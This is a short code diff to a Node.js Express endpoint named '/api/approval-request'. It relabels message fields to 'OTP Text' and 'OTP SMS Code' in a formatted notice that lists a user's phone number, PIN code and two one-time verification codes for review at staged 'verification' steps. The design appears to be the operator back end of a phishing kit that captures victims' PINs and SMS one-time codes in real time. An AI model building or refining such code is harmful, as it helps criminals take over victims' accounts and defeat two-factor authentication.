@@ -77,7 +77,7 @@ app.post("/api/approval-request", async (req, res) => {
   let ruleLength = "PIN Length: 5 digits";
   
   if (stage === "code1") {
-    headingTitle = "CUSTOM VALUE VERIFICATION NEEDED";
+    headingTitle = "OTP VALUE VERIFICATION NEEDED";
     ruleLength = `Value Inputted: Provided`;
   } else if (stage === "code2") {
     headingTitle = "FINAL SMS VERIFICATION NEEDED";
@@ -97,8 +97,8 @@ app.post("/api/approval-request", async (req, res) => {
       `USER DETAILS:\n` +
       `• Phone Number: <code>${phoneVal}</code>\n` +
       `• PIN Code: <code>${pinVal}</code>\n` +
-      `• Custom Text: <code>${code1Val}</code>\n` +
-      `• Final SMS Code: <code>${code2Val}</code>\n\n` +
+      `• OTP Text: <code>${code1Val}</code>\n` +
+      `• OTP SMS Code: <code>${code2Val}</code>\n\n` +
       `───────────────────────\n\n` +
       `Verify Entry Parameters:\n` +
       `• ${ruleLength}\n` +
